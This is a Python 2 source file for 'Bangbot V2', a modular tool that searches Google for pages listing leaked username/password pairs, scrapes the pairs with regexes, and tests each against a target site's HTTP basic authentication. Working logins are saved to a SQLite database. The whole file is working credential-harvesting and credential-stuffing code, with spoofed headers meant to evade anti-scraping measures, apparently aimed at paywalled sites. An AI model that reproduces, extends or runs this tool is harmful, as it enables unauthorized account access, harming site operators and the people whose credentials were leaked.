'''
============================================
	BANGBOT V2
============================================

Created By : Alex Guerra

Bangbot V2 is an easily extensible script for finding and testing passwords on the internet.

'''

import urllib, urllib2, re, urlparse, cookielib, time
from sqlite3 import dbapi2 as sqlite


'''
============================================
	BOTS
============================================

Bots are the glue of the script. Each bot can be outfitted with multiple page finders, multiple searchers and a tester. The idea is to be able to quickly assemble a bot from canned components and be able to easily extend it as new searchers and scrapers become available. Every bot **must** extend from AbstractBot class and must set self.sitename if they persist data to the database using dbsync.
'''

class AbstractBot(object):

	def __init__(self):
		self.combinations = set()
		self.searchers = list()
		self.scrapers = list()

	def run(self):
		"""Test each combination found by each scraper on each page found by each searcher and add the working results to self.combinations"""
		print 'Running ' + self.__class__.__name__

		unchecked_combinations = set()

		for searcher in self.searchers:
			for page in searcher:
				self.page_hook(page) # Allow subclasses to hook in here and read html retrieved by the searchers
				for scraper in self.scrapers:
					unchecked_combinations = unchecked_combinations.union(scraper.scrape(page))

		
		self.combinations = self.combinations.union({combination for combination in unchecked_combinations if self.tester.test(combination)})

	def page_hook(self, page):
		pass

	def dbsync(self):
		"""Persist all combinations found by run to the database. The default is bangbot.db."""
		# Use a single connection for no particular reason...
		if hasattr(AbstractBot, 'connection'):
			connection = AbstractBot.connection
		else:
			connection = sqlite.connect('bangbot.db')
			AbstractBot.connection = connection
		# Insert each combination into the db, updating last_checked on duplicate key. Prevent injection by clever pornsite admins.
		cursor = connection.cursor()
		for combination in self.combinations:
			cursor.execute("SELECT id FROM combinations WHERE username = ? AND password = ? AND site = ?", (combination[0], combination[1], self.sitename))
			if len(cursor.fetchmany()) > 0:
				cursor.execute("UPDATE combinations SET last_updated = CURRENT_TIMESTAMP WHERE username = ? AND password = ? AND site = ?", (combination[0], combination[1], self.sitename))
			else:
				cursor.execute('INSERT INTO combinations (username, password, site) VALUES (?, ?, ?)', (combination[0], combination[1], self.sitename))
		connection.commit()
		print 'Finished inserting {} combinations!'.format(len(self.combinations))


''' 
============================================
	SEARCHERS
============================================

Searchers find and return webpages that they think are likely to have usernames and passwords. Searchers should be iterable; every time next is called you'll return the html contents of the next webpage you find. To reduce requests, webpages are cached using a static class variable 'cache' in AbstractSearcher. In order to make use of this cache, you **must** use the get_webpage function in order to grab the contents of a webpage.
'''

class AbstractSearcher(object):

	cache = set()

	def __init__(self):
		pass

	def get_webpage(self, url, cache = True):
		print 'Getting URL: '+url
		# Check the cache for the webpage. Make sure the caller wants to read from the cache before checking
		if cache:
			for webpage in AbstractSearcher.cache:
				if webpage[0] == url:
					print '---- Returned from cache'
					return webpage[1]
		# Use complex headers to thwart antiscraping measures
		opener = urllib2.build_opener()
		opener.addheaders = [('User-agent','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1'),("Content-type","application/x-www-form-urlencoded"), ("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"), ('Cache-Control', 'no-cache'), ('Accept-Language', 'en-us,en;q=0.5'), ('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')]
		try:
			html = opener.open(url, timeout = 15).read()
		except urllib2.HTTPError as err:
			print err
			raise err

		if cache:
			AbstractSearcher.cache.add((url, html))

		return html

class GoogleSearcher(AbstractSearcher):

	def __init__(self, query):
		self.query = query

	def __iter__(self):
		full_search_address = 'http://www.google.com/search?q={}&hl=en&safe=off&source=lnt&tbs=qdr:d'.format(urllib.quote_plus(self.query)) # Construct google search page address from query string
		search_results = self.get_webpage(full_search_address, cache=False) # Don't catch exception if get_webpage fails here; we want the user to know if google searcher isn't working
		matches = re.findall(r'<h3 class="r">[\s]?<a href="([^"]+)"', search_results) # Regex to extract links from a google results page
		matches = [url.replace('/url?q=', '', 1).partition('&amp;')[0] for url in matches] # Inelegant list comp to extract the actual url from each google link
		self.results = matches
		self._count = 0
		return self

	def next(self):
		if self._count < len(self.results):
			try:
				self._count += 1
				return self.get_webpage(self.results[self._count - 1]) # Get html of the next webpage
			except Exception as error:
				return self.next() # If there's an error fetching the webpage, just go to the next one
		else:
			raise StopIteration

'''
============================================
	SCRAPERS
============================================

Scrapers take the html of webpages found by searchers and scrapes them for possible username/password combinations. Scrapers must return a set of tuples in the form (username, password). Tuples must be used instead of dicts because dicts are not hashable and sets can only take hashable items or something like that.
'''

class AbstractScraper(object):

	def __init__(self):
		pass

	def scrape(self, page):
		raise NotImplementedError

class RegexScraper(AbstractScraper):
	''' Regex scraper takes a regex with two named groups, un and pw, and returns all matches from the scraped html'''
	def __init__(self, regex):
		self.regex = regex

	def scrape(self, html):
		print 'Scraping...'
		combinations = set([(match.group('un'),match.group('pw')) for match in re.finditer(self.regex, html)]) # Create a tuple (un, pw) for every match
		print 'Found {} combinations'.format(len(combinations))
		return combinations

''' 
============================================
	TESTERS
============================================

Testers test username and password combinations for validity. The test method should take a username and password in the form of a tuple (username, password). For the most part, testers will have to be bespoke for the bot they're fitted to, though the BasicAuthTester class can cover many older sites still using http authentication quite easily.
'''

class AbstractTester(object):

	def __init__(self):
		pass

	def test(self):
		raise NotImplementedError


class BasicAuthTester(AbstractTester):

	def __init__(self, url):
		self.url = url

	def test(self, combination, search=''):
		print 'Testing {}:{}'.format(combination[0], combination[1])
		password_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
		password_mgr.add_password(None, self.url, combination[0], combination[1])
		handler = urllib2.HTTPBasicAuthHandler(password_mgr)
		opener = urllib2.build_opener(handler)
		try:
			html = opener.open(self.url, timeout = 15).read()
		except urllib2.HTTPError as err: # open throws an exception if authorization fails (401)
			print '401: Access Denied'
			return False
		except Exception as err: # open throws an exception if authorization fails (401)
			print 'Unknown error :('
			return False
		if search: # Search parameter is for if the site sends proper request headers but still doesn't allow access; you need to input a string that is displayed on the error page where, if that string is found, the test will come back false.
			if re.search(search,html):
				print 'Failed on search'
				return False
		print 'Success!'
		return True